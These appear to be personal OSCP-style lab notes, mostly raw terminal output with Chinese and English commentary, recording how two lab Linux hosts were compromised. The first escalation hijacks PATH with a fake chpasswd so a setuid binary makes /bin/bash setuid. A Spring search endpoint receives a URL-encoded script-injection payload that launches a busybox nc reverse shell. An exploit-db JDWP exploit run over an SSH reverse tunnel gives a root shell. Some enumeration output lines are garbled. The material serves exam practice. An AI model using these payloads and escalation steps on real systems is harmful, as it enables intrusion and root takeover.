--2026-07-05 14:28:57--  https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github.com/diego-treitos/linux-smart-enumeration/releases/download/4.14nw/lse.sh [following]
--2026-07-05 14:28:58--  https://github.com/diego-treitos/linux-smart-enumeration/releases/download/4.14nw/lse.sh
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $python -m uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

192.168.240.149 - - [05/Jul/2026 14:30:50] "GET /lse.sh HTTP/1.1" 200 -


```

```
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:~$ curl http://192.168.45.161:8000/lse.sh -o lse.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 55098  100 55098    0     0   353k      0 --:--:-- --:--:-- --:--:--  356k

```

```
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:~$ chmod +x lse.sh 
```

```
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:~$ ./RESET_PASSWD
Resetting password of kiero to the default value
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:~$ ls -la RESET_PASSWD 
-rwsrwsr-x 1 root root 16792 Nov 21  2022 RESET_PASSWD
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:~$ strings
^C
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:~$ strings RESET_PASSWD 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
echo kiero:kiero | chpasswd
echo Resetting password of 'kiero' to the default value
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
RESET_PASSWD.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment

```

```
cd /tmp
cat << 'EOF' > chpasswd
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x chpasswd

这里选择让 /bin/bash 变成 setuid 程序,之后执行 bash -p 就能获得 root shell。

第二步:把 /tmp 加到 PATH 最前面
bash
export PATH=/tmp:$PATH

第三步:回到 john 的家目录,执行 RESET_PASSWD
bash
cd /home/john
./RESET_PASSWD

程序内部执行 chpasswd 时,由于 /tmp 在 PATH 最前面,会优先执行我们伪造的 /tmp/chpasswd,以 root 权限运行,给 /bin/bash 加上 setuid 位。

第四步:验证并获取 root shell
bash
ls -la /bin/bash
bash -p
whoami
```

```
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:~$ 
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:~$ cd /tmp
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:/tmp$ cat << 'EOF' > chpasswd
> #!/bin/bash
> chmod u+s /bin/bash
> EOF
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:/tmp$ chmod +x chpasswd
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:/tmp$ export PATH=/tmp:$PATH
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:/tmp$ cd /home/john
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:~$ ./RESET_PASSWD
Resetting password of kiero to the default value
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:~$ bash -p
bash-5.0# 
bash-5.0# whoami 
root
bash-5.0# 

```

### IP 5

```
Nmap scan report for 192.168.217.150
Host is up (0.039s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:61:0d:71:ab:c0:a8:e9:21:3c:ef:3c:a2:4a:8d:f8 (ECDSA)
|_  256 44:4e:eb:a4:2d:a5:65:4c:38:82:8e:1e:9e:7a:bd:5b (ED25519)
8080/tcp open  http    Apache Tomcat (language: en)
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
|_http-favicon: Spring Java Framework
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.62 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-05 19:35 HKT
Nmap scan report for 192.168.217.150
Host is up (0.039s latency).
Not shown: 95 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
9/udp     closed discard
19/udp    closed chargen
20031/udp closed bakbonenetvault
32768/udp closed omad
49192/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds

```

![Pasted image 20260705193811.png](/ob/Pasted%20image%2020260705193811.png)

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $gobuster dir -u http://192.168.217.150:8080/  -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.217.150:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/[                    (Status: 400) [Size: 800]
/]                    (Status: 400) [Size: 800]
/error                (Status: 500) [Size: 105]
/favicon.ico          (Status: 200) [Size: 946]
/plain]               (Status: 400) [Size: 800]
/quote]               (Status: 400) [Size: 800]
/search               (Status: 200) [Size: 25]

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $curl http://192.168.217.150:8080/search?query=test
{"query":"test","result":""}[ble: EOF]         
```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $feroxbuster -u http://192.168.217.150:8080
                                                                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.217.150:8080/
 🚩  In-Scope Url          │ 192.168.217.150
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        4w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        1w       19c http://192.168.217.150:8080/
200      GET        1l        1w       25c http://192.168.217.150:8080/search
500      GET        1l        3w      105c http://192.168.217.150:8080/error
200      GET        8l       30w      194c http://192.168.217.150:8080/CHANGELOG
400      GET        1l       31w      800c http://192.168.217.150:8080/plain]
400      GET        1l       31w      800c http://192.168.217.150:8080/[
400      GET        1l       31w      800c http://192.168.217.150:8080/]
400      GET        1l       31w      800c http://192.168.217.150:8080/quote]
400      GET        1l       31w      800c http://192.168.217.150:8080/extension]
400      GET        1l       31w      800c http://192.168.217.150:8080/[0-9]

```

![Pasted image 20260705195308.png](/ob/Pasted%20image%2020260705195308.png)

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $wget https://www.exploit-db.com/download/52261
--2026-07-05 19:54:13--  https://www.exploit-db.com/download/52261
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1865 (1.8K) [application/txt]

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $curl http://192.168.217.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27busybox%20nc%20192.168.45.161%204444%20-e%20sh%27%29%7D%25

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $ rlwrap nc -nlvp 4444 
Listening on 0.0.0.0 4444
Connection received on 192.168.217.150 47760
ls
bin

```

```LSE Version: 4.14nw

        User: dev
     User ID: 1001
    Password: none
        Home: /home/dev
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
       umask: 0022

    Hostname: lab-pwk2-student-cl5-150-ubuntu20-berlin-249-167
       Linux: 5.15.0-52-generic
Distribution: Ubuntu 22.04.1 LTS
Architecture: x86_64

=====================( Current Output Verbosity Level: 0 )======================
===============================================================( humanity )=====
[!] nowar0 Should we question autocrats and their "military operations"?... yes!
---
                                      NO   
                                      WAR  
---
==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. yes!
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip
[i] usr060 Other users..................................................... skip
[*] usr070 PATH variables defined inside /etc.............................. yes!
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
 yes!st000 Writable files outside user's home..............................
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/snap/snapd/17336/usr/lib/snapd/snap-confine
/snap/snapd/15534/usr/lib/snapd/snap-confine
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip
[!] fst060 Can we write to any setgid binary?.............................. skip
[*] fst070 Can we read /root?.............................................. nope
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
 nopest130 Does 'dev' have mail?...........................................
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
 nopest160 Can we write to critical files?.................................
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'dev'....................................... skip
[i] fst510 SSH files anywhere.............................................. skip
[i] fst520 Check hosts.equiv file and its contents......................... skip
[i] fst530 List NFS server shares.......................................... skip
[i] fst540 Dump fstab file................................................. skip
=================================================================( system )=====
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip
s the /etc/passwd have hashes?............................... nope
[!] sys022 Does the /etc/group have hashes?................................ nope
 nopeys030 Can we read shadow files?.......................................
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip
[i] sys080 System password policies in /etc/login.defs..................... skip
===============================================================( security )=====
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
[!] ret060 Can we write to executable paths present in cron jobs........... nope
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====
 yes!et000 Services listening only on localhost............................
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip
[i] net520 ARP table....................................................... skip
[i] net530 Nameservers..................................................... skip
[i] net540 Systemd Nameservers............................................. skip
[i] net550 Listening TCP................................................... skip
................................................... skip
===============================================================( services )=====
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
..................... nopenit.d/ not belonging to root
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
............................. nopeging to root
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip
[i] srv420 List /etc/xinetd.d if used...................................... skip
................................... skip
[i] srv440 List /etc/rc.d/init.d permissions............................... skip
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
[i] srv460 List /etc/init/ permissions..................................... skip
[!] srv500 Can we write in systemd service files?.......................... nope
.......... nopewe write in binaries executed by systemd services?
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
 nopeof020 Can we connect to PostgreSQL template1 as psql and no pass?.....
[*] sof030 Installed apache modules........................................ nope
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
 nopeof070 Can we write to a ssh-agent socket?.............................
 nopeof080 Can we write to a gpg-agent socket?.............................
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
 nopeof130 Can we write to tmux session sockets from other users?..........
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[*] sof170 Can we access MongoDB databases without credentials?............ nope
[!] sof180 Can we access any Kerberos credentials?......................... nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip
[i] sof520 Postgres version................................................ skip
[i] sof530 Apache version.................................................. skip
[i] sof540 Tmux version.................................................... skip
[i] sof550 Screen version.................................................. skip
=============================================================( containers )=====
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip
===================================================================( CVEs )=====
[!] cve-2019-5736 Escalate in some types of docker containers.............. nope
 nopeve-2021-3156 Sudo Baron Samedit vulnerability.........................
[!] cve-2021-3560 Checking for policykit vulnerability..................... nope
 nopeve-2021-4034 Checking for PwnKit vulnerability........................
[!] cve-2022-0847 Dirty Pipe vulnerability................................. nope
 nopeve-2022-25636 Netfilter linux kernel vulnerability....................
 yes!ve-2023-22809 Sudoedit bypass in Sudo <= 1.9.12p1.....................
---
Vulnerable! sudo version: 1.9.9-1ubuntu2.1
---

```

```
https://www.exploit-db.com/download/51217
```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $wget https://www.exploit-db.com/download/51217
--2026-07-05 20:40:04--  https://www.exploit-db.com/download/51217
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1620 (1.6K) [application/txt]

```

### Privilege Escalation  特權升級

Executed linpeas and found that JDWP service is running on port 8000 with root privileges and vulnerable to exploitation\
執行 linpea，發現 JDWP 服務在 8000 埠執行，擁有 root 權限，且容易被利用

* java -Xdebug -Xrunjdwp:transport=dt\_socket,address=8000,server=y /opt/stats/App.java\
  java -Xdebug -Xrunjdwp：transport=dt\_socket，address=8000，server=y /opt/stats/App.java

```
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
root           1  0.0  0.6 167628 12960 ?        Ss   03:16   0:01 /sbin/init
root         500  0.0  1.1  80664 24048 ?        S<s  03:16   0:00 /lib/systemd/systemd-journald
root         541  0.0  1.3 354888 27364 ?        SLsl 03:16   0:00 /sbin/multipathd -d -s
root         543  0.0  0.3  25736  6760 ?        Ss   03:16   0:00 /lib/systemd/systemd-udevd
systemd+     724  0.0  0.3  89352  6544 ?        Ssl  03:17   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         733  0.0  0.5  51124 11936 ?        Ss   03:17   0:00 /usr/bin/VGAuthService
root         734  0.0  0.4 315928  9800 ?        Ssl  03:17   0:06 /usr/bin/vmtoolsd
systemd+     820  0.0  0.3  16236  8068 ?        Ss   03:17   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+     822  0.0  0.6  25392 12260 ?        Ss   03:17   0:00 /lib/systemd/systemd-resolved
  └─(Caps) 0x0000000000002000=cap_net_raw
dev          841  1.1 26.3 2616740 533860 ?      Ssl  03:17   2:31 java -jar /opt/dev/api.jar
dev         2273  0.0  0.0   2456     4 ?        S    06:59   0:00  _ sh
dev         2275  0.0  0.1   7368  3464 ?        S    07:00   0:00      _ /bin/bash
dev         2278  0.0  0.4  17480  8700 ?        S    07:01   0:00          _ python3 -c import pty; pty.spawn("/bin/bash")
dev         2279  0.0  0.2   8692  5312 pts/0    Ss   07:01   0:00              _ /bin/bash
dev         2286  0.0  0.2   8692  5376 pts/0    S    07:01   0:00                  _ /bin/bash
dev         2296  0.0  0.2   8584  5336 pts/0    S    07:02   0:00                      _ /bin/bash
dev         2313  0.1  0.1   4004  2988 pts/0    S+   07:03   0:00                          _ /bin/sh ./linpeas.sh
dev         5625  0.0  0.0   4004  1204 pts/0    S+   07:04   0:00                          |   _ /bin/sh ./linpeas.sh
dev         5629  0.0  0.1  10404  3784 pts/0    R+   07:04   0:00                          |   |   _ ps fauxwww
dev         5628  0.0  0.0   4004  1204 pts/0    S+   07:04   0:00                          |   _ /bin/sh ./linpeas.sh
dev         2314  0.0  0.0   5772  1020 pts/0    S+   07:03   0:00                          _ tee linpeas
root         843  0.0  0.1   6892  3048 ?        Ss   03:17   0:00 /usr/sbin/cron -f -P
message+     845  0.0  0.2   8892  4680 ?        Ss   03:17   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         852  0.0  0.9  32780 18496 ?        Ss   03:17   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         853  0.0  0.3 234492  6692 ?        Ssl  03:17   0:00 /usr/libexec/polkitd --no-debug
syslog       854  0.0  0.2 222400  5664 ?        Ssl  03:17   0:00 /usr/sbin/rsyslogd -n -iNONE
root         856  0.0  1.4 1318624 28632 ?       Ssl  03:17   0:00 /usr/lib/snapd/snapd
root         859  0.0  1.7 2528964 35288 ?       Ssl  03:17   0:00 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
root         860  0.0  0.3  15024  6240 ?        Ss   03:17   0:00 /lib/systemd/systemd-logind
root         862  0.0  0.6 392584 12908 ?        Ssl  03:17   0:00 /usr/libexec/udisks2/udisksd
root         870  0.0  0.0   6172  1108 tty1     Ss+  03:17   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root         894  0.0  0.5 317008 11820 ?        Ssl  03:17   0:00 /usr/sbin/ModemManager
root         949  0.0  1.0 109756 20976 ?        Ssl  03:17   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root        1525  0.0  0.4 313340  8924 ?        Ssl  04:45   0:00 /usr/libexec/upowerd
root        1797  0.0  0.9 295628 18600 ?        Ssl  04:45   0:00 /usr/libexec/packagekitd
```

Downloaded exploit code  下載的漏洞利用程式碼

* <https://www.exploit-db.com/exploits/46501>

```
┌──(kali🎃kali)-[~/oscp/150]
└─$ searchsploit jdwp
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
Java Debug Wire Protocol (JDWP) - Remote Code Execution                               | java/remote/46501.py
-------------------------------------------------------------------------------------- ---------------------------------
```

Set up SSH reverse port forwarding to access port 8000 from kali\
設定 SSH 反向埠轉發，從 Kali 存取 8000 埠

```
dev@oscp:/$ ssh -f -N -R 8000:localhost:8000 kali@192.168.45.187
ssh -f -N -R 8000:localhost:8000 kali@192.168.45.187
 
The authenticity of host '192.168.45.187 (192.168.45.187)' can't be established.
ED25519 key fingerprint is SHA256:C/sPlE+2KjQOvOF6Xgy+YaE8+67OyeJHsui04dPIApU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])?
Host key verification failed.
dev@oscp:/$ ssh -f -N -R 8000:localhost:8000 kali@192.168.45.187
ssh -f -N -R 8000:localhost:8000 kali@192.168.45.187
The authenticity of host '192.168.45.187 (192.168.45.187)' can't be established.
ED25519 key fingerprint is SHA256:C/sPlE+2KjQOvOF6Xgy+YaE8+67OyeJHsui04dPIApU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Warning: Permanently added '192.168.45.187' (ED25519) to the list of known hosts.
kali@192.168.45.187's password: kali
```

Executed reverse shell listener\
執行的反向 shell 監聽器

```
┌──(kali🎃kali)-[~/oscp]
└─$ rlwrap nc -nlvp 9999
listening on [any] 9999 ...
```

Executed POC  執行的 POC

```
┌──(kali🎃kali)-[~/oscp]
└─$ ./ex.sh
{"query":"${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.45.187 4444 -e sh')}%","result":""}            
┌──(kali🎃kali)-[~/oscp]
└─$ python2 46501.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc 192.168.45.187 9999 -e sh'
[+] Targeting '127.0.0.1:8000'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.16'
[+] Found Runtime class: id=8b1
[+] Found Runtime.getRuntime(): id=7f395402e0a8
[+] Created break event id=2
[+] Waiting for an event on 'java.net.ServerSocket.accept'
```

After POC execution, verified port 5000 was open and connected to it to trigger the event\
執行 POC 後，驗證埠 5000 已開啟並連接以觸發事件

```
dev@oscp:/$ ss -nltp
ss -nltp
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*
LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
LISTEN 0      50                 *:5000            *:*
LISTEN 0      100                *:8080            *:*    users:(("java",pid=841,fd=11))
LISTEN 0      128             [::]:22           [::]:*
dev@oscp:/$ nc 127.0.0.1 5000
nc 127.0.0.1 5000
```

POC event triggered, command executed, and successfully obtained reverse shell connection as root\
觸發 POC 事件、指令執行，並成功取得 root 的反向 shell 連線

```
┌──(kali🎃kali)-[~/oscp]
└─$ rlwrap nc -nlvp 9999
listening on [any] 9999 ...
connect to [192.168.45.187] from (UNKNOWN) [192.168.162.150] 46746
 
whoami
root
id
uid=0(root) gid=0(root)
```
